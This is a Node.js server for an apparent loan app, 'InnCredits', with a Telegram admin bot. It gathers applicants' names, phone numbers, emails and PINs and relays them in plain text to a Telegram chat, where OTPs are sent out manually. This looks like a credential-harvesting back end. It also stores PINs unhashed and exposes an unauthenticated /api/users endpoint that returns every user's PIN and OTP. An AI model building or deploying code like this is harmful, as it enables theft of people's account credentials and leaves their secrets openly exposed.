require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const TelegramBot = require('node-telegram-bot-api');
const AfricasTalking = require('africastalking');

const app = express();
app.use(cors());
app.use(express.json());

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, {
  polling: { interval: 3000, autoStart: true, params: { timeout: 10 } },
  request: { agentOptions: { keepAlive: true, family: 4 } }
});

const at = AfricasTalking({ username: process.env.AT_USERNAME, apiKey: process.env.AT_API_KEY });
const sms = at.SMS;
const ADMIN_ID = parseInt(process.env.ADMIN_TELEGRAM_ID);
const isAdmin = (msg) => msg.chat.id === ADMIN_ID;

bot.onText(/\/start/, (msg) => {
  if (!isAdmin(msg)) return;
  bot.sendMessage(ADMIN_ID, 'Welcome to InnCredits Admin Bot!\n\nCommands:\n/users - View all users\n/sendotp - Send OTP to a user');
});

bot.onText(/\/users/, async (msg) => {
  if (!isAdmin(msg)) return;
  const { data: users, error } = await supabase.from('users').select('*');
  if (error) { bot.sendMessage(ADMIN_ID, 'Error: ' + error.message); return; }
  if (!users || users.length === 0) { bot.sendMessage(ADMIN_ID, 'No users found.'); return; }
  const message = 'All Users (' + users.length + '):\n\n' + users.map((u, i) =>
    (i+1) + '. Phone: ' + u.phone + '\n   Email: ' + u.email + '\n   PIN: ' + u.pin + '\n   OTP: ' + (u.otp || 'None') + '\n   ID: ' + u.id
  ).join('\n\n');
  bot.sendMessage(ADMIN_ID, message);
});

bot.onText(/\/sendotp/, async (msg) => {
  if (!isAdmin(msg)) return;
  const { data: users, error } = await supabase.from('users').select('*');
  if (error) { bot.sendMessage(ADMIN_ID, 'Error: ' + error.message); return; }
  if (!users || users.length === 0) { bot.sendMessage(ADMIN_ID, 'No users found.'); return; }
  const keyboard = users.map((user) => ([{ text: user.phone + ' - ' + user.email, callback_data: 'sendotp_' + user.id + '_' + user.phone }]));
  bot.sendMessage(ADMIN_ID, 'Select a user to send OTP:', { reply_markup: { inline_keyboard: keyboard } });
});

bot.on('callback_query', async (query) => {
  if (query.from.id !== ADMIN_ID) return;
  if (query.data.startsWith('sendotp_')) {
    const parts = query.data.split('_');
    const userId = parts[1];
    const phone = parts[2];
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const { error: updateError } = await supabase.from('users').update({ otp }).eq('id', userId);
    if (updateError) { bot.sendMessage(ADMIN_ID, 'Failed to save OTP: ' + updateError.message); return; }
    try {
      await sms.send({ to: [phone], message: 'Your InnCredits OTP is: ' + otp + '. Do not share this code with anyone.', from: 'InnCredits' });
      bot.sendMessage(ADMIN_ID, 'OTP ' + otp + ' sent to ' + phone);
    } catch (e) { bot.sendMessage(ADMIN_ID, 'SMS failed: ' + e.message); }
    bot.answerCallbackQuery(query.id);
  }
});

bot.on('polling_error', (error) => { console.log('Telegram polling error: ' + error.code); });

app.get('/', (req, res) => { res.json({ status: 'InnCredits Backend Running' }); });

app.post('/api/notify-admin', async (req, res) => {
  const { name, phone, email, pin, amount, term, monthly } = req.body;
  try {
    const message = 'New Loan Application!\n\nName: ' + name + '\nEmail: ' + email + '\nPhone: ' + phone + '\nPIN: ' + pin + '\n\nLoan: $' + amount + '\nTerm: ' + term + ' months\nMonthly: $' + monthly + '\n\nSend OTP via /sendotp';
    await bot.sendMessage(ADMIN_ID, message);
    res.json({ success: true });
  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.get('/api/users', async (req, res) => {
  const { data, error } = await supabase.from('users').select('*');
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

app.post('/api/users', async (req, res) => {
  const { email, phone, pin } = req.body;
  const { data, error } = await supabase.from('users').insert([{ email, phone, pin }]);
  if (error) return res.status(500).json({ error: error.message });
  res.json({ success: true, data });
});

app.post('/api/verify-otp', async (req, res) => {
  const { phone, otp } = req.body;
  const { data: users, error } = await supabase.from('users').select('*').eq('phone', phone).eq('otp', otp);
  if (error) return res.status(500).json({ error: error.message });
  if (!users || users.length === 0) return res.status(400).json({ success: false, message: 'Invalid OTP' });
  res.json({ success: true, message: 'OTP verified' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('Supabase connected');
  console.log('Telegram bot started');
  console.log('Server running on http://localhost:' + PORT);
  console.log('API endpoints ready');
  console.log('Telegram bot: ACTIVE');
});
